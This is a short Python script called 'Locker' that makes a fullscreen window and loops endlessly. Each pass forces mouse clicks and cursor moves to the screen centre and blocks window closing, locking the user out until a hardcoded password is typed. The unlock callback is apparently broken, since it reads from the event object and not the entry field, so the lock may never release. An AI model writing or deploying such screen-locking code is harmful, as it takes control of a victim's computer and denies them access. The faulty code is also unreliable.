from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global k, entry
    if event.get() == "hello":
        k = True

def on_closing():
    click(960, 540)
    moveTo(960, 540)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)

root = Tk()
root.title("Locker")
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=885, y=515)
label0 = Label(root, text="Locker by arcturus5340")
label0.grid(row=0, column=0)
label1 = Label(root, text="Write password and Press Ctrl+C", font="Arial 20")
label1.place(x=600, y=300)
root.update()
sleep(0.2)
click(675, 420)
k = False
while not k:
    on_closing()
